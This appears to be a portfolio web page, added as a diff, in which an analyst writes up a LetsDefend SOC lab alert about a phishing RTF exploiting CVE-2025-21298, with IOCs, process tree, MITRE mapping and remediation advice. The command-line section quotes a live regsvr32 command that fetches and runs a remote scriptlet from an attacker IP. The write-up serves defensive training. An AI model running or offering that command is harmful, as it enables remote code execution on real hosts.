@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SOC336 — Windows OLE RCE | John Mark Piedad</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{--bg:#0a0a0a;--surface:#111;--card:#141414;--border:#2a2a2a;--gold:#f0b429;--gold-bg:rgba(240,180,41,0.08);--gold-border:rgba(240,180,41,0.25);--text:#e8e8e8;--muted:#888;--muted2:#555;--white:#fff;--green:#22c55e;--grid:rgba(255,255,255,0.025)}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'Inter',sans-serif;font-weight:400;line-height:1.7;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(var(--grid) 1px,transparent 1px),linear-gradient(90deg,var(--grid) 1px,transparent 1px);background-size:60px 60px;pointer-events:none;z-index:0}
+nav{position:fixed;top:0;left:0;right:0;z-index:100;display:flex;justify-content:space-between;align-items:center;padding:1rem 2.5rem;background:rgba(10,10,10,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border)}
+.nav-brand{display:flex;align-items:center;gap:.6rem;text-decoration:none}
+.nav-brand svg{width:22px;height:22px}
+.nav-brand-text{font-size:14px;font-weight:700;color:var(--white);letter-spacing:.05em}
+.nav-back{font-size:13px;font-weight:500;color:var(--muted);text-decoration:none;display:flex;align-items:center;gap:.4rem;transition:color .2s}
+.nav-back:hover{color:var(--gold)}
+.nav-back svg{width:16px;height:16px;stroke:currentColor;fill:none;stroke-width:2}
+.hero{padding:8rem 2rem 4rem;max-width:900px;margin:0 auto;position:relative;z-index:1}
+.breadcrumb{font-size:12px;color:var(--muted2);margin-bottom:1.5rem;display:flex;align-items:center;gap:.5rem}
+.breadcrumb a{color:var(--muted);text-decoration:none;transition:color .2s}.breadcrumb a:hover{color:var(--gold)}.breadcrumb span{color:var(--muted2)}
+.report-badge{display:inline-flex;align-items:center;gap:.5rem;font-size:11px;font-weight:700;letter-spacing:.08em;padding:.3rem .9rem;border-radius:3px;margin-bottom:1.25rem;background:var(--gold-bg);color:var(--gold);border:1px solid var(--gold-border)}
+.badge-dot{width:6px;height:6px;border-radius:50%;background:currentColor}
+h1{font-size:clamp(1.8rem,4vw,2.8rem);font-weight:800;color:var(--white);line-height:1.15;margin-bottom:1rem}
+h1 span{color:var(--gold)}
+.hero-underline{width:60px;height:2px;background:var(--gold);margin-bottom:1.5rem}
+.meta-row{display:flex;flex-wrap:wrap;gap:.75rem;margin-bottom:2rem}
+.meta-pill{font-size:12px;font-weight:500;padding:.3rem .85rem;border-radius:20px;border:1px solid var(--border);color:var(--muted);background:var(--card)}
+.meta-pill.high{color:#f97316;border-color:rgba(249,115,22,0.3);background:rgba(249,115,22,0.08)}
+.meta-pill.platform{color:var(--gold);border-color:var(--gold-border);background:var(--gold-bg)}
+.content{max-width:900px;margin:0 auto;padding:0 2rem 6rem;position:relative;z-index:1}
+.section{margin-bottom:2.5rem}
+.section-title{font-size:13px;font-weight:700;color:var(--gold);letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem;display:flex;align-items:center;gap:.6rem}
+.section-title::before{content:'';display:inline-block;width:16px;height:1px;background:var(--gold)}
+h2{font-size:1.1rem;font-weight:700;color:var(--white);margin:1.75rem 0 .75rem}
+h3{font-size:.95rem;font-weight:600;color:var(--gold);margin:1.25rem 0 .5rem}
+p{font-size:.9rem;color:var(--muted);line-height:1.85;margin-bottom:.85rem}
+p strong{color:var(--text);font-weight:600}
+.summary-box{background:var(--card);border:1px solid var(--border);border-left:3px solid var(--gold);border-radius:6px;padding:1.5rem;margin-bottom:2rem}
+.summary-box p{margin:0;font-size:.92rem;line-height:1.85;color:var(--text)}
+table{width:100%;border-collapse:collapse;margin-bottom:1.5rem;font-size:.85rem;background:var(--card);border:1px solid var(--border);border-radius:6px;overflow:hidden}
+th{text-align:left;font-size:11px;font-weight:700;color:var(--muted2);letter-spacing:.08em;text-transform:uppercase;padding:.6rem 1rem;border-bottom:1px solid var(--border);background:var(--surface)}
+td{padding:.65rem 1rem;border-bottom:1px solid rgba(42,42,42,0.5);color:var(--muted);vertical-align:top}
+td:first-child{color:var(--text);font-weight:500;white-space:nowrap}
+tr:last-child td{border-bottom:none}
+.verdict-cell{font-weight:600}.verdict-m{color:#ef4444}.verdict-s{color:#f97316}
+code,pre{font-family:'Courier New',monospace;background:var(--surface);border:1px solid var(--border);border-radius:4px;font-size:.82rem}
+code{padding:.15rem .5rem;color:var(--gold)}
+pre{padding:1.25rem;overflow-x:auto;line-height:1.7;margin-bottom:1.5rem;color:var(--text)}
+pre code{background:none;border:none;padding:0;color:var(--text)}
+.flow-box{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin-bottom:1.5rem}
+.flow-box pre{background:none;border:none;padding:0;margin:0;color:var(--text)}
+.mitre-tag{display:inline-block;font-size:11px;font-weight:600;padding:.2rem .6rem;background:var(--gold-bg);color:var(--gold);border:1px solid var(--gold-border);border-radius:3px;margin:.2rem .2rem 0 0}
+.verdict-box{background:var(--card);border:1px solid var(--gold-border);border-radius:6px;padding:1.5rem;margin-bottom:1.5rem;text-align:center}
+.verdict-box .v-label{font-size:11px;font-weight:700;letter-spacing:.1em;color:var(--muted2);text-transform:uppercase;margin-bottom:.5rem}
+.verdict-box .v-text{font-size:1.05rem;font-weight:700;color:var(--gold)}
+.rec-list{list-style:none;display:flex;flex-direction:column;gap:.5rem;margin-bottom:1.5rem}
+.rec-list li{display:flex;align-items:flex-start;gap:.75rem;font-size:.88rem;color:var(--muted);padding:.6rem .9rem;background:var(--card);border:1px solid var(--border);border-radius:4px}
+.rec-list li::before{content:'→';color:var(--gold);font-weight:700;flex-shrink:0}
+.learning-list{list-style:none;display:flex;flex-direction:column;gap:.75rem;margin-bottom:1.5rem}
+.learning-list li{padding:1rem 1.25rem;background:var(--card);border:1px solid var(--border);border-left:2px solid var(--gold);border-radius:0 4px 4px 0;font-size:.88rem;color:var(--muted);line-height:1.75}
+.learning-list li strong{color:var(--text);display:block;margin-bottom:.2rem}
+.ti-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:.75rem;margin-bottom:1.5rem}
+.ti-card{background:var(--card);border:1px solid var(--border);border-radius:6px;padding:.9rem 1.1rem;display:flex;justify-content:space-between;align-items:center}
+.ti-name{font-size:.85rem;font-weight:600;color:var(--text)}
+.ti-verdict{font-size:11px;font-weight:700;color:var(--gold)}
+.gallery-link-btn{display:inline-flex;align-items:center;gap:.6rem;font-size:13px;font-weight:600;padding:.65rem 1.4rem;border-radius:6px;border:1.5px solid var(--gold);color:var(--gold);background:var(--gold-bg);text-decoration:none;transition:all .2s;margin-bottom:2rem}
+.gallery-link-btn:hover{background:var(--gold);color:#000}
+footer{border-top:1px solid var(--border);padding:2rem;text-align:center;position:relative;z-index:1}
+footer p{font-size:13px;color:var(--muted2)}
+footer a{color:var(--gold);text-decoration:none}
+@media(max-width:700px){nav{padding:1rem 1.5rem}.hero,.content{padding-left:1.25rem;padding-right:1.25rem}td:first-child{white-space:normal}}
+
+.gallery-link-btn{display:inline-flex;align-items:center;gap:.6rem;font-size:13px;font-weight:600;padding:.65rem 1.4rem;border-radius:6px;border:1.5px solid var(--gold);color:var(--gold);background:var(--gold-bg);text-decoration:none;transition:all .2s;margin-bottom:2rem}
+.gallery-link-btn:hover{background:var(--gold);color:#000}
+</style>
+</head>
+<body>
+<nav>
+  <a class="nav-brand" href="index.html">
+    <svg viewBox="0 0 24 24" fill="none" stroke="#f0b429" stroke-width="1.8"><path d="M12 2L3 7v5c0 5.25 3.75 10.15 9 11.25C17.25 22.15 21 17.25 21 12V7L12 2z"/></svg>
+    <span class="nav-brand-text">JOHN MARK</span>
+  </a>
+  <a class="nav-back" href="index.html#labs"><svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"/></svg>Back to Labs</a>
+</nav>
+
+<div class="hero">
+  <div class="breadcrumb"><a href="index.html">Home</a><span>/</span><a href="index.html#labs">Labs</a><span>/</span><span>SOC336</span></div>
+  <div class="report-badge"><span class="badge-dot"></span>TRUE POSITIVE</div>
+  <h1>SOC336 — Windows OLE<br><span>Zero-Click RCE (CVE-2025-21298)</span></h1>
+  <div class="hero-underline"></div>
+  <div class="meta-row">
+    <span class="meta-pill platform">LetsDefend</span>
+    <span class="meta-pill high">High Severity</span>
+    <span class="meta-pill">CVE Exploit</span>
+    <span class="meta-pill">LOLBin</span>
+    <span class="meta-pill">Fileless</span>
+    <span class="meta-pill">Process Tree</span>
+  </div>
+</div>
+
+<div class="content">
+  <a href="gallery-soc336.html" class="gallery-link-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="16" height="16"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>View Walkthrough Screenshots (23)</a>
+
+  <div class="section">
+    <div class="section-title">Summary</div>
+    <div class="summary-box">
+      <p>A phishing email containing <strong>mail.rtf</strong> was delivered to <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="23625650574a4d634f465750474645464d470d4a4c">[email&#160;protected]</a>. The attachment exploited <strong>CVE-2025-21298</strong>, a Windows OLE zero-click RCE vulnerability. The attack triggered a process chain from Outlook abusing <strong>regsvr32.exe</strong> (a LOLBin) to fetch and execute a remote scriptlet fileless from an attacker-controlled server. The host was confirmed compromised and isolated via EDR.</p>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Alert Details</div>
+    <table>
+      <tr><th>Field</th><th>Value</th></tr>
+      <tr><td>Recipient</td><td><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b6f7c3c5c2dfd8f6dad3c2c5d2d3d0d3d8d298dfd9">[email&#160;protected]</a></td></tr>
+      <tr><td>Host IP</td><td>172.16.17.137</td></tr>
+      <tr><td>Sender</td><td><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="96e6e4f9fcf3f5e2fbf7f8f7f1f3fbf3f8e2d6e6fbb8fbf3">[email&#160;protected]</a></td></tr>
+      <tr><td>Attachment</td><td>mail.rtf</td></tr>
+      <tr><td>File Hash (SHA256)</td><td><code>df993d03...94184</code></td></tr>
+      <tr><td>Email Delivery</td><td>05:12 AM</td></tr>
+      <tr><td>Alert Triggered</td><td>04:18 PM (~11 hrs later)</td></tr>
+      <tr><td>CVE</td><td>CVE-2025-21298</td></tr>
+      <tr><td>Device Action</td><td>Allowed</td></tr>
+    </table>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Indicators of Compromise</div>
+    <table>
+      <tr><th>Type</th><th>Value</th><th>Verdict</th></tr>
+      <tr><td>Sender email</td><td><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="addddfc2c7c8ced9c0ccc3cccac8c0c8c3d9edddc083c0c8">[email&#160;protected]</a></td><td class="verdict-cell verdict-s">Suspicious</td></tr>
+      <tr><td>Attachment</td><td>mail.rtf</td><td class="verdict-cell verdict-m">Malicious</td></tr>
+      <tr><td>File hash (SHA256)</td><td><code>df993d03...94184</code></td><td class="verdict-cell verdict-m">Malicious</td></tr>
+      <tr><td>C2 / Payload IP</td><td>84.38.130.118</td><td class="verdict-cell verdict-m">Malicious</td></tr>
+      <tr><td>Malicious script</td><td><code>hxxp[://]84[.]38[.]130[.]118/shell.sct</code></td><td class="verdict-cell verdict-m">Malicious</td></tr>
+      <tr><td>CVE</td><td>CVE-2025-21298</td><td class="verdict-cell verdict-m">Windows OLE RCE</td></tr>
+    </table>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Threat Intelligence</div>
+    <div class="ti-grid">
+      <div class="ti-card"><span class="ti-name">VirusTotal</span><span class="ti-verdict">22/59 flagged</span></div>
+      <div class="ti-card"><span class="ti-name">Hybrid Analysis</span><span class="ti-verdict">100/100 malicious</span></div>
+      <div class="ti-card"><span class="ti-name">IBM X-Force</span><span class="ti-verdict">High Risk</span></div>
+      <div class="ti-card"><span class="ti-name">Cisco Talos</span><span class="ti-verdict">Malicious</span></div>
+      <div class="ti-card"><span class="ti-name">LetsDefend TI</span><span class="ti-verdict">Confirmed match</span></div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Investigation Walkthrough</div>
+    <h3>1. Initial Alert Review</h3>
+    <p>Reviewed all alert metadata. A significant time gap — email at <strong>05:12 AM</strong>, alert at <strong>04:18 PM</strong> — confirmed the user manually opened the attachment ~11 hours after delivery, initiating the exploit.</p>
+    <h3>2. EDR — Process Tree Analysis</h3>
+    <p>EDR on host Austin revealed a highly suspicious execution chain:</p>
+    <pre><code>OUTLOOK.exe
+    └── Explorer.exe
+            └── cmd.exe
+                    └── regsvr32.exe</code></pre>
+    <p>Outlook spawning cmd.exe then regsvr32.exe is not normal behavior — these are <strong>LOLBins (Living-Off-The-Land Binaries)</strong> abused to evade detection.</p>
+    <h3>3. Command-Line Analysis</h3>
+    <p>The exact malicious command executed:</p>
+    <pre><code>C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118/shell.sct scrobj.dll</code></pre>
+    <p>This is a regsvr32 AppLocker bypass — malicious code executes entirely in memory, leaving no traditional executable on disk.</p>
+    <h3>4. Network Analysis</h3>
+    <p>Confirmed a successful outbound connection to <code>hxxp[://]84[.]38[.]130[.]118/shell.sct</code>. Not quarantined because regsvr32.exe is a trusted signed Windows binary.</p>
+    <h3>5. File Analysis</h3>
+    <p>mail.rtf confirmed to exploit CVE-2025-21298 — a Windows OLE vulnerability that triggers RCE on simply opening or previewing the file. No macro enablement or further interaction required.</p>
+    <h3>6. Containment</h3>
+    <p>Immediately <strong>isolated host Austin via EDR</strong> to cut off C2 communication and preserve forensic evidence.</p>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Attack Flow</div>
+    <div class="flow-box">
+      <pre>Phishing email delivered (<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="265654494c4345524b47484741434b43485266564b084b43">[email&#160;protected]</a>)
+        ↓
+User opens mail.rtf ~11 hours after delivery
+        ↓
+CVE-2025-21298 triggered — Windows OLE zero-click RCE
+        ↓
+OUTLOOK.exe → Explorer.exe → cmd.exe spawned
+        ↓
+regsvr32.exe fetches + executes shell.sct (fileless)
+        ↓
+Outbound C2 connection to 84.38.130.118 confirmed
+        ↓
+Host isolated via EDR</pre>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">MITRE ATT&CK Mapping</div>
+    <table>
+      <tr><th>Technique ID</th><th>Name</th><th>Description</th></tr>
+      <tr><td><span class="mitre-tag">T1566.001</span></td><td>Spearphishing Attachment</td><td>Malicious RTF delivered via targeted email</td></tr>
+      <tr><td><span class="mitre-tag">T1203</span></td><td>Exploitation for Client Execution</td><td>CVE-2025-21298 Windows OLE RCE exploit</td></tr>
+      <tr><td><span class="mitre-tag">T1218.010</span></td><td>System Binary Proxy: Regsvr32</td><td>LOLBin abuse to execute remote scriptlet</td></tr>
+      <tr><td><span class="mitre-tag">T1059.005</span></td><td>Command and Scripting Interpreter</td><td>shell.sct scriptlet execution</td></tr>
+      <tr><td><span class="mitre-tag">T1071.001</span></td><td>Application Layer Protocol</td><td>C2 communication over HTTP</td></tr>
+      <tr><td><span class="mitre-tag">T1027</span></td><td>Obfuscated Files or Information</td><td>Fileless execution — payload runs in memory</td></tr>
+    </table>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Verdict</div>
+    <div class="verdict-box">
+      <div class="v-label">Final Classification</div>
+      <div class="v-text">True Positive — Confirmed Malicious Activity</div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Recommendations</div>
+    <ul class="rec-list">
+      <li>Block C2 IP 84.38.130.118 at network perimeter and firewall</li>
+      <li>Block sender email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="98e8eaf7f2fdfbecf5f9f6f9fffdf5fdf6ecd8e8f5b6f5fd">[email&#160;protected]</a> in email gateway</li>
+      <li>Apply Microsoft security patch for CVE-2025-21298 across all endpoints</li>
+      <li>Implement detection rules for regsvr32.exe spawning from OUTLOOK.exe</li>
+      <li>Enable Script Block Logging and AMSI to detect fileless scriptlet execution</li>
+      <li>Reset credentials for affected user <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2061555354494e604c455453444546454e440e494f">[email&#160;protected]</a></li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Key Learnings</div>
+    <ul class="learning-list">
+      <li><strong>LOLBin abuse is subtle but detectable.</strong> regsvr32.exe and cmd.exe are legitimate tools — context (spawned from OUTLOOK.exe) makes them suspicious, not the process name alone.</li>
+      <li><strong>Fileless techniques bypass traditional AV.</strong> No file dropped to disk means signature-based tools can't detect it. Behavioral EDR is essential for catching this class of attack.</li>
+      <li><strong>Zero-click RCE is especially dangerous.</strong> CVE-2025-21298 requires no macro enablement — just opening the RTF is enough to trigger the exploit.</li>
+      <li><strong>Delivery time vs alert trigger time matters.</strong> The 11-hour gap confirmed user-initiated action, which shaped the entire investigation timeline.</li>
+      <li><strong>Multi-source TI accelerates triage.</strong> Five platforms all agreeing the file is malicious removed all doubt quickly and confidently.</li>
+    </ul>
+  </div>
+
+</div>
+
+<footer>
+  <p>John Mark Piedad &nbsp;·&nbsp; <a href="index.html">Back to Portfolio</a></p>
+</footer>
+
+<a href="https://github.com/piedad-johnmark/portfolio-projects/blob/781fe7ddf80f2370d224f800335cbb2796f97c69/letsdefend-labs/SOC336-windows-ole-rce-analysis.md" target="_blank" style="position:fixed;bottom:2rem;right:2rem;z-index:200;display:flex;align-items:center;gap:.6rem;background:#f0b429;color:#000;font-family:Inter,sans-serif;font-size:13px;font-weight:700;padding:.7rem 1.25rem;border-radius:6px;text-decoration:none;box-shadow:0 4px 20px rgba(240,180,41,0.3);"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>View on GitHub</a>
+
+</body>
+</html>
